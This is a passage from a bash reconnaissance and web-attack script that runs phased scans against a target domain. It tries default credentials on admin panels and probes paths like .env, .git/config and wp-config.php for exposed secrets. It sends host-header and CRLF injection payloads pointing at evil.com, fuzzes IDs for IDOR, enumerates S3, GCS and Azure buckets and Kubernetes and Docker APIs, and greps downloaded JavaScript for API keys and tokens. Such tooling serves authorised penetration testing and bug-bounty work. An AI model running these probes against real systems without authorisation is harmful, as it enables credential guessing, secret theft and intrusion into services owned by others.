    CRED_PAIRS=("admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "guest:guest")
    if [[ -f "$AUTH_OUT/admin_panels.txt" ]]; then
        while IFS= read -r line; do
            PANEL_URL=$(echo "$line" | grep -oE 'https?://[^ ]+')
            [[ -z "$PANEL_URL" ]] && continue
            for cred in "${CRED_PAIRS[@]}"; do
                USER="${cred%%:*}"; PASS="${cred##*:}"
                RESP=$(curl -sk --max-time 8 -c /tmp/recon_cookie_jar \
                    -d "username=$USER&password=$PASS" \
                    -X POST "$PANEL_URL" \
                    -w "%{http_code}" -o /dev/null 2>/dev/null || true)
                # 302 on POST often means successful login
                if [[ "$RESP" == "302" ]]; then
                    echo "[DEFAULT-CRED] $PANEL_URL $USER:$PASS [HTTP $RESP]" | tee -a "$AUTH_OUT/default_creds.txt"
                fi
            done
        done < "$AUTH_OUT/admin_panels.txt"
    fi

    # --- JWT testing with nuclei ---
    log "Running JWT/OAuth nuclei templates..."
    nuclei -l "$OUT/live/urls.txt" -tags "jwt,oauth,token,auth" -silent \
        -o "$AUTH_OUT/jwt_oauth_nuclei.txt" -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    # --- Check for token/auth exposure in headers ---
    log "Checking for auth header exposure..."
    while IFS= read -r url; do
        HEADERS=$(curl -sk --max-time 8 -I "$url" 2>/dev/null || true)
        if echo "$HEADERS" | grep -qiE "(authorization:|x-auth-token:|x-api-key:|www-authenticate:)"; then
            echo "[AUTH-HEADER] $url" >> "$AUTH_OUT/auth_headers.txt"
            echo "$HEADERS" | grep -iE "(authorization:|x-auth-token:|x-api-key:|www-authenticate:)" >> "$AUTH_OUT/auth_headers.txt"
        fi
    done < "$OUT/live/urls.txt"

    ok "Auth/JWT/OAuth scan complete"
    mark_done "15"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 16 — INFORMATION DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 16 — Information Disclosure"

if ! skip_if_done "16"; then
    INFO_OUT="$OUT/vulns/info"
    mkdir -p "$INFO_OUT"

    # --- Sensitive file exposure ---
    log "Checking for exposed sensitive files..."
    SENSITIVE_PATHS=(
        ".git/HEAD" ".git/config" ".git/COMMIT_EDITMSG"
        ".env" ".env.local" ".env.production" ".env.backup"
        ".htpasswd" ".htaccess"
        "config.yml" "config.yaml" "config.json" "config.php" "config.xml"
        "database.yml" "database.json" "db.json"
        "wp-config.php" "wp-config.php.bak"
        "web.config" "web.config.bak"
        "application.properties" "application.yml"
        "settings.py" "local_settings.py"
        "docker-compose.yml" "docker-compose.yaml" ".dockerenv"
        "Dockerfile" ".travis.yml" ".circleci/config.yml"
        "backup.zip" "backup.tar.gz" "backup.sql"
        "dump.sql" "db.sql" "database.sql"
        "robots.txt" "sitemap.xml" "crossdomain.xml" "clientaccesspolicy.xml"
        "phpinfo.php" "info.php" "test.php" "debug.php"
        "swagger.json" "swagger.yaml" "openapi.json" "api-docs.json"
        "v1/api-docs" "v2/api-docs" "api/swagger.json"
        "actuator" "actuator/env" "actuator/mappings" "actuator/health"
        "server-status" "server-info" "nginx_status"
        "graphql" "graphiql" "__graphql"
        ".DS_Store" "Thumbs.db"
        "readme.txt" "README.md" "CHANGELOG.md" "INSTALL.md"
        "package.json" "composer.json" "Gemfile" "requirements.txt"
    )

    while IFS= read -r url; do
        for path in "${SENSITIVE_PATHS[@]}"; do
            RESP=$(curl -sk --max-time 8 -w "\n%{http_code}" "${url}/${path}" 2>/dev/null || true)
            CODE=$(echo "$RESP" | tail -1)
            BODY=$(echo "$RESP" | head -n -1)

            if [[ "$CODE" == "200" ]]; then
                # Check content is meaningful (not just a 200 empty page)
                LEN=${#BODY}
                if [[ "$LEN" -gt 20 ]]; then
                    echo "[EXPOSED] ${url}/${path} [${CODE}] (${LEN} bytes)" | tee -a "$INFO_OUT/sensitive_files.txt"
                fi
            fi
        done
        sleep 0.1
    done < <(head -30 "$OUT/live/urls.txt")

    # --- Backup file discovery ---
    log "Checking for backup files alongside known endpoints..."
    if [[ -s "$OUT/web/endpoints_dynamic.txt" ]]; then
        while IFS= read -r url; do
            for ext in .bak .old .orig .backup .copy .tmp .swp "~" .1 .2; do
                TEST="${url}${ext}"
                CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$TEST" 2>/dev/null || true)
                [[ "$CODE" == "200" ]] && echo "[BACKUP] $TEST" | tee -a "$INFO_OUT/backup_files.txt"
            done
        done < <(head -50 "$OUT/web/endpoints_dynamic.txt")
    fi

    # --- Nuclei info disclosure templates ---
    nuclei -l "$OUT/live/urls.txt" -tags "exposure,misconfig,info,backup,git" -silent \
        -o "$INFO_OUT/nuclei_info.txt" -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    ok "Information disclosure scan complete"
    mark_done "16"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 17 — HTTP SMUGGLING, HOST HEADER & CRLF
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 17 — HTTP Smuggling / Host Header / CRLF"

if ! skip_if_done "17"; then
    SMUGGLE_OUT="$OUT/vulns/smuggling"
    mkdir -p "$SMUGGLE_OUT"

    # --- Host header injection ---
    log "Testing host header injection..."
    HOST_PAYLOADS=(
        "evil.com"
        "evil.com:80"
        "${TARGET}.evil.com"
        "evil.com%0d%0aX-Injected: header"
    )

    while IFS= read -r url; do
        for payload in "${HOST_PAYLOADS[@]}"; do
            RESP=$(curl -sk --max-time 8 \
                -H "Host: $payload" \
                -H "X-Forwarded-Host: $payload" \
                -H "X-Host: $payload" \
                -w "\n%{http_code}" \
                "$url" 2>/dev/null || true)
            CODE=$(echo "$RESP" | tail -1)
            BODY=$(echo "$RESP" | head -n -1)

            if echo "$BODY" | grep -qF "$payload"; then
                echo "[HOST-HEADER-REFLECTED] $url | Payload: $payload [HTTP $CODE]" | tee -a "$SMUGGLE_OUT/host_header.txt"
            fi
        done
        sleep 0.15
    done < <(head -20 "$OUT/live/urls.txt")

    # --- CRLF injection ---
    log "Testing CRLF injection..."
    CRLF_PAYLOADS=(
        "%0d%0aX-CRLF-Injected: test"
        "%0aX-CRLF-Injected: test"
        "%0d%0aSet-Cookie: crlf=injected"
        "/%0d%0aLocation: https://evil.com"
    )

    while IFS= read -r url; do
        for payload in "${CRLF_PAYLOADS[@]}"; do
            RESP_HEADERS=$(curl -sk --max-time 8 -I "${url}${payload}" 2>/dev/null || true)
            if echo "$RESP_HEADERS" | grep -qi "X-CRLF-Injected\|crlf=injected"; then
                echo "[CRLF] ${url}${payload}" | tee -a "$SMUGGLE_OUT/crlf.txt"
            fi
        done
        sleep 0.1
    done < <(head -20 "$OUT/live/urls.txt")

    # --- Nuclei smuggling/header templates ---
    nuclei -l "$OUT/live/urls.txt" \
        -tags "smuggling,crlf,host-header" -silent \
        -o "$SMUGGLE_OUT/nuclei_smuggling.txt" \
        -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    ok "Smuggling/Host Header/CRLF scan complete"
    mark_done "17"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 18 — IDOR & ACCESS CONTROL
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 18 — IDOR & Access Control"

if ! skip_if_done "18"; then
    IDOR_OUT="$OUT/vulns/access"
    mkdir -p "$IDOR_OUT"

    # --- IDOR: fuzz numeric IDs ---
    log "Testing IDOR on ID parameters..."
    if [[ -s "$OUT/web/endpoints_id_params.txt" ]]; then
        while IFS= read -r url; do
            # Get baseline response for original ID
            ORIG_CODE=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || true)
            ORIG_LEN=$(curl -sk --max-time 8 "$url" 2>/dev/null | wc -c || echo 0)

            # Test adjacent IDs
            for fuzz_id in 1 2 3 100 1000 99999 0 -1; do
                TEST_URL=$(echo "$url" | sed -E "s/(id=|uid=|user_id=|userid=|account=|account_id=|order=|order_id=|invoice=|ticket=|num=|pid=|oid=|rid=|cid=)[^&]*/\1${fuzz_id}/gi")
                [[ "$TEST_URL" == "$url" ]] && continue

                FUZZ_CODE=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" "$TEST_URL" 2>/dev/null || true)
                FUZZ_LEN=$(curl -sk --max-time 8 "$TEST_URL" 2>/dev/null | wc -c || echo 0)

                # Flag if 200 response with significant content — possible IDOR
                if [[ "$FUZZ_CODE" == "200" && "$FUZZ_LEN" -gt 100 ]]; then
                    echo "[IDOR-CANDIDATE] $TEST_URL [orig_len=$ORIG_LEN, fuzz_len=$FUZZ_LEN]" | tee -a "$IDOR_OUT/idor_candidates.txt"
                fi
            done
            sleep 0.15
        done < <(head -30 "$OUT/web/endpoints_id_params.txt")
    fi

    # --- Forced browsing / privilege escalation paths ---
    log "Testing common privileged paths without auth..."
    PRIV_PATHS=(
        "admin/users" "admin/config" "admin/settings" "admin/logs"
        "api/admin" "api/users" "api/v1/users" "api/v1/admin"
        "api/v1/config" "api/internal" "api/private"
        "management" "manage" "internal" "private"
        "debug" "trace" "heap" "threaddump"
    )

    while IFS= read -r url; do
        for path in "${PRIV_PATHS[@]}"; do
            CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "${url}/${path}" 2>/dev/null || true)
            if [[ "$CODE" == "200" || "$CODE" == "301" ]]; then
                echo "[ACCESS] ${url}/${path} [HTTP $CODE]" | tee -a "$IDOR_OUT/access_control.txt"
            fi
        done
    done < <(head -15 "$OUT/live/urls.txt")

    # --- Nuclei access control templates ---
    nuclei -l "$OUT/live/urls.txt" \
        -tags "idor,exposure,misconfig" -silent \
        -o "$IDOR_OUT/nuclei_access.txt" \
        -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    ok "IDOR & access control scan complete"
    mark_done "18"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 19 — GRAPHQL, CLOUD & WEBSOCKET
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 19 — GraphQL / Cloud / WebSocket"

if ! skip_if_done "19"; then
    CLOUD_OUT="$OUT/vulns/cloud"
    mkdir -p "$CLOUD_OUT"

    # --- GraphQL introspection ---
    log "Testing GraphQL endpoints..."
    GRAPHQL_QUERY='{"query":"{__schema{types{name}}}"}'
    INTROSPECTION_QUERY='{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}'

    while IFS= read -r url; do
        for gql_path in "/graphql" "/gql" "/api/graphql" "/v1/graphql" "/graphiql" "/__graphql" "/query"; do
            GQL_URL="${url}${gql_path}"
            RESP=$(curl -sk --max-time 10 \
                -X POST "$GQL_URL" \
                -H "Content-Type: application/json" \
                -d "$GRAPHQL_QUERY" 2>/dev/null || true)

            if echo "$RESP" | grep -q "__schema\|queryType\|data"; then
                echo "[GRAPHQL] $GQL_URL — introspection enabled" | tee -a "$CLOUD_OUT/graphql.txt"
                # Run full introspection
                curl -sk --max-time 15 -X POST "$GQL_URL" \
                    -H "Content-Type: application/json" \
                    -d "$INTROSPECTION_QUERY" > "$CLOUD_OUT/graphql_schema_$(echo "$GQL_URL" | md5sum | awk '{print $1}').json" 2>/dev/null || true
            fi
        done
    done < "$OUT/live/urls.txt"

    # --- Cloud storage enumeration ---
    log "Enumerating cloud storage buckets..."
    # Generate common bucket name permutations
    BUCKET_NAMES=()
    for prefix in "" "dev-" "staging-" "prod-" "backup-" "assets-" "static-" "media-" "uploads-" "data-"; do
        for suffix in "" "-dev" "-staging" "-prod" "-backup" "-assets" "-static" "-media" "-uploads" "-data" "-public"; do
            BUCKET_NAMES+=("${prefix}${TARGET}${suffix}" "${prefix}${TARGET//./-}${suffix}")
        done
    done

    for bucket in "${BUCKET_NAMES[@]}"; do
        # AWS S3
        S3_RESP=$(curl -sk --max-time 6 "https://${bucket}.s3.amazonaws.com/" 2>/dev/null || true)
        if echo "$S3_RESP" | grep -qiE "(ListBucketResult|Contents|Key>)"; then
            echo "[S3-PUBLIC] https://${bucket}.s3.amazonaws.com/" | tee -a "$CLOUD_OUT/s3_buckets.txt"
        elif echo "$S3_RESP" | grep -qi "NoSuchBucket"; then
            true  # doesn't exist
        elif echo "$S3_RESP" | grep -qi "AccessDenied\|AllAccessDisabled"; then
            echo "[S3-EXISTS-PRIVATE] ${bucket}" >> "$CLOUD_OUT/s3_buckets.txt"
        fi

        # GCS
        GCS_RESP=$(curl -sk --max-time 6 "https://storage.googleapis.com/${bucket}/" 2>/dev/null || true)
        if echo "$GCS_RESP" | grep -qiE "(ListBucketResult|items|prefixes)"; then
            echo "[GCS-PUBLIC] https://storage.googleapis.com/${bucket}/" | tee -a "$CLOUD_OUT/gcs_buckets.txt"
        fi

        # Azure Blob
        AZ_RESP=$(curl -sk --max-time 6 "https://${bucket//./-}.blob.core.windows.net/${bucket//./-}?restype=container&comp=list" 2>/dev/null || true)
        if echo "$AZ_RESP" | grep -qi "EnumerationResults"; then
            echo "[AZURE-PUBLIC] ${bucket}" | tee -a "$CLOUD_OUT/azure_blobs.txt"
        fi
    done

    # --- Kubernetes / Docker API exposure ---
    log "Checking for exposed container APIs..."
    while IFS= read -r url; do
        for k8s_path in "/api/v1" "/api/v1/pods" "/api/v1/secrets" "/version" "/metrics"; do
            RESP=$(curl -sk --max-time 6 "${url}${k8s_path}" 2>/dev/null || true)
            if echo "$RESP" | grep -qiE "(apiVersion|kind|serverVersion|Pod|Secret|Namespace)"; then
                echo "[K8S-EXPOSED] ${url}${k8s_path}" | tee -a "$CLOUD_OUT/k8s_exposure.txt"
            fi
        done
        # Docker API
        DOCKER_RESP=$(curl -sk --max-time 6 "${url}/v1.24/containers/json" 2>/dev/null || true)
        if echo "$DOCKER_RESP" | grep -qi "Id\|Image\|Command"; then
            echo "[DOCKER-API] ${url}/v1.24/containers/json" | tee -a "$CLOUD_OUT/docker_exposure.txt"
        fi
    done < "$OUT/live/urls.txt"

    # --- WebSocket detection ---
    log "Detecting WebSocket endpoints..."
    while IFS= read -r url; do
        WS_URL="${url/https:/wss:}"
        WS_URL="${WS_URL/http:/ws:}"
        for ws_path in "/ws" "/websocket" "/socket" "/socket.io" "/ws/chat" "/live" "/stream" "/events" "/feed"; do
            # Check if upgrade header is accepted
            RESP=$(curl -sk --max-time 6 \
                -H "Upgrade: websocket" \
                -H "Connection: Upgrade" \
                -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                -H "Sec-WebSocket-Version: 13" \
                -o /dev/null -w "%{http_code}" \
                "${url}${ws_path}" 2>/dev/null || true)
            if [[ "$RESP" == "101" || "$RESP" == "400" ]]; then
                echo "[WEBSOCKET] ${url}${ws_path} [HTTP $RESP]" | tee -a "$CLOUD_OUT/websockets.txt"
            fi
        done
    done < <(head -20 "$OUT/live/urls.txt")

    # --- Nuclei cloud templates ---
    nuclei -l "$OUT/live/urls.txt" \
        -tags "graphql,aws,azure,gcp,kubernetes,docker,cloud" -silent \
        -o "$CLOUD_OUT/nuclei_cloud.txt" \
        -c "$NUCLEI_CONCURRENCY" \
        2>>"$LOG" || true

    ok "GraphQL/Cloud/WebSocket scan complete"
    mark_done "19"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 20 — SECRET SCANNING
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 20 — Secret & Credential Scanning"

if ! skip_if_done "20"; then
    SECRET_OUT="$OUT/secrets"

    if [[ -s "$OUT/js/js_files.txt" ]]; then
        log "Downloading JS files..."
        JS_DIR="$SECRET_OUT/js_files"
        mkdir -p "$JS_DIR"

        head -200 "$OUT/js/js_files.txt" | while IFS= read -r jsurl; do
            FNAME=$(echo "$jsurl" | md5sum | awk '{print $1}').js
            curl -sk --max-time 10 "$jsurl" -o "$JS_DIR/$FNAME" 2>/dev/null || true
        done

        log "Running trufflehog..."
        trufflehog filesystem "$JS_DIR" \
            --json \
            > "$SECRET_OUT/trufflehog_js.json" 2>>"$LOG" || warn "trufflehog had errors"
    fi

    log "Regex scanning for secrets..."
    grep -rhoiE \
        "(api[_-]?key|apikey|secret|token|password|passwd|pwd|auth|bearer|\
aws_access|aws_secret|AKIA[A-Z0-9]{16}|private[_-]?key|\
['\"][0-9a-f]{32,64}['\"]|ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|\
sk-[a-zA-Z0-9]{48}|xox[baprs]-[0-9a-zA-Z\-]+)" \
        "$SECRET_OUT/js_files/" \
        2>/dev/null | sort -u > "$SECRET_OUT/regex_secrets.txt" || true

    ok "Secret scanning complete"
    mark_done "20"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 21 — SCREENSHOTS
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 21 — Screenshots (gowitness)"

if ! skip_if_done "21"; then
    log "Capturing screenshots of $(wc -l < "$OUT/live/urls.txt") live hosts..."
    gowitness scan file \
        -f "$OUT/live/urls.txt" \
        --screenshot-path "$OUT/screenshots" \
        --log-level error \
        2>>"$LOG" || warn "gowitness had errors"
    ok "Screenshots saved"
    mark_done "21"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 22 — SUBDOMAIN TAKEOVER
# ═══════════════════════════════════════════════════════════════════════════════
step "PHASE 22 — Subdomain Takeover"

if ! skip_if_done "22"; then
    nuclei \
        -l "$OUT/live/urls.txt" \
        -tags takeover \
        -silent \
        -severity medium,high,critical \
        -o "$OUT/vulns/takeovers.txt" \
        2>>"$LOG" || warn "takeover scan had errors"
    ok "Takeover check complete"
    mark_done "22"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY REPORT
# ═══════════════════════════════════════════════════════════════════════════════
step "Generating Reports"

END_TIME=$(date +%s)
ELAPSED=$(( END_TIME - START_TIME ))
HOURS=$(( ELAPSED / 3600 )); MINUTES=$(( (ELAPSED % 3600) / 60 ))

count_lines() { [[ -f "$1" ]] && grep -c . "$1" 2>/dev/null || echo 0; }

# ─── Markdown summary ────────────────────────────────────────────────────────
cat > "$SUMMARY" <<EOF
# Recon Summary — $TARGET
**Date:** $(date)
**Duration:** ${HOURS}h ${MINUTES}m
**Output:** $OUT

---

## Enumeration
| Category | Count |
|---|---|
| Subdomains (raw) | $(count_lines "$OUT/subdomains/all_subs_raw.txt") |
| Subdomains (in-scope) | $(count_lines "$OUT/subdomains/all_subs.txt") |
| Live hosts | $(count_lines "$OUT/live/urls.txt") |
| Total URLs | $(count_lines "$OUT/web/all_urls.txt") |
| JS files | $(count_lines "$OUT/js/js_files.txt") |

## Vulnerability Findings
| Check | Findings |
|---|---|
| Nuclei Critical | $(count_lines "$OUT/vulns/nuclei_critical.txt") |
| Nuclei High | $(count_lines "$OUT/vulns/nuclei_high.txt") |
| Nuclei Medium | $(count_lines "$OUT/vulns/nuclei_medium.txt") |
| XSS (dalfox) | $(count_lines "$OUT/vulns/xss_dalfox.txt") |
| SQLi | $(count_lines "$OUT/vulns/injection/sqli_results.txt") |
| SSRF | $(count_lines "$OUT/vulns/injection/ssrf.txt") |
| SSTI | $(count_lines "$OUT/vulns/injection/ssti.txt") |
| XXE | $(count_lines "$OUT/vulns/injection/xxe.txt") |
| Command Injection | $(count_lines "$OUT/vulns/injection/cmdi.txt") |
| CORS | $(count_lines "$OUT/vulns/cors.txt") |
| Open Redirects | $(count_lines "$OUT/vulns/open_redirects.txt") |
| Admin Panels | $(count_lines "$OUT/vulns/auth/admin_panels.txt") |
| Default Creds | $(count_lines "$OUT/vulns/auth/default_creds.txt") |
| Sensitive Files | $(count_lines "$OUT/vulns/info/sensitive_files.txt") |
| Backup Files | $(count_lines "$OUT/vulns/info/backup_files.txt") |
| Host Header Injection | $(count_lines "$OUT/vulns/smuggling/host_header.txt") |
| CRLF Injection | $(count_lines "$OUT/vulns/smuggling/crlf.txt") |
| IDOR Candidates | $(count_lines "$OUT/vulns/access/idor_candidates.txt") |
| GraphQL Exposed | $(count_lines "$OUT/vulns/cloud/graphql.txt") |
| Cloud Buckets (public) | $(( $(count_lines "$OUT/vulns/cloud/s3_buckets.txt") + $(count_lines "$OUT/vulns/cloud/gcs_buckets.txt") + $(count_lines "$OUT/vulns/cloud/azure_blobs.txt") )) |
| WebSockets Found | $(count_lines "$OUT/vulns/cloud/websockets.txt") |
| Subdomain Takeovers | $(count_lines "$OUT/vulns/takeovers.txt") |
| Secrets (regex) | $(count_lines "$OUT/secrets/regex_secrets.txt") |

---
*Generated by recon.sh*
EOF

# ─── JSON summary ─────────────────────────────────────────────────────────────
cat > "$SUMMARY_JSON" <<EOF
{
  "target": "$TARGET",
  "timestamp": "$TIMESTAMP",
  "date": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "duration_seconds": $ELAPSED,
  "output_dir": "$OUT",
  "enumeration": {
    "subdomains_raw": $(count_lines "$OUT/subdomains/all_subs_raw.txt"),
    "subdomains_inscope": $(count_lines "$OUT/subdomains/all_subs.txt"),
    "live_hosts": $(count_lines "$OUT/live/urls.txt"),
    "total_urls": $(count_lines "$OUT/web/all_urls.txt"),
    "js_files": $(count_lines "$OUT/js/js_files.txt")
  },
  "vulnerabilities": {
    "nuclei_critical": $(count_lines "$OUT/vulns/nuclei_critical.txt"),
    "nuclei_high": $(count_lines "$OUT/vulns/nuclei_high.txt"),
    "nuclei_medium": $(count_lines "$OUT/vulns/nuclei_medium.txt"),
    "xss": $(count_lines "$OUT/vulns/xss_dalfox.txt"),
    "sqli": $(count_lines "$OUT/vulns/injection/sqli_results.txt"),
    "ssrf": $(count_lines "$OUT/vulns/injection/ssrf.txt"),
    "ssti": $(count_lines "$OUT/vulns/injection/ssti.txt"),
    "xxe": $(count_lines "$OUT/vulns/injection/xxe.txt"),
    "cmdi": $(count_lines "$OUT/vulns/injection/cmdi.txt"),
    "cors": $(count_lines "$OUT/vulns/cors.txt"),
    "open_redirects": $(count_lines "$OUT/vulns/open_redirects.txt"),
    "admin_panels": $(count_lines "$OUT/vulns/auth/admin_panels.txt"),
    "default_creds": $(count_lines "$OUT/vulns/auth/default_creds.txt"),
    "sensitive_files": $(count_lines "$OUT/vulns/info/sensitive_files.txt"),
    "backup_files": $(count_lines "$OUT/vulns/info/backup_files.txt"),
    "host_header": $(count_lines "$OUT/vulns/smuggling/host_header.txt"),
    "crlf": $(count_lines "$OUT/vulns/smuggling/crlf.txt"),
    "idor_candidates": $(count_lines "$OUT/vulns/access/idor_candidates.txt"),
    "graphql_exposed": $(count_lines "$OUT/vulns/cloud/graphql.txt"),
    "websockets": $(count_lines "$OUT/vulns/cloud/websockets.txt"),
    "subdomain_takeovers": $(count_lines "$OUT/vulns/takeovers.txt"),
    "secrets_regex": $(count_lines "$OUT/secrets/regex_secrets.txt")
  }
}
EOF

ok "Reports written"
echo ""
echo -e "${BOLD}${GREEN}══════════════════════════════════════${RESET}"
echo -e "${BOLD}${GREEN}  RECON COMPLETE — ${HOURS}h ${MINUTES}m${RESET}"
echo -e "${BOLD}${GREEN}══════════════════════════════════════${RESET}"
echo -e "  Summary  : $SUMMARY"
echo -e "  JSON     : $SUMMARY_JSON"
echo -e "  Full out : $OUT"
echo -e "${BOLD}${GREEN}══════════════════════════════════════${RESET}"
echo ""
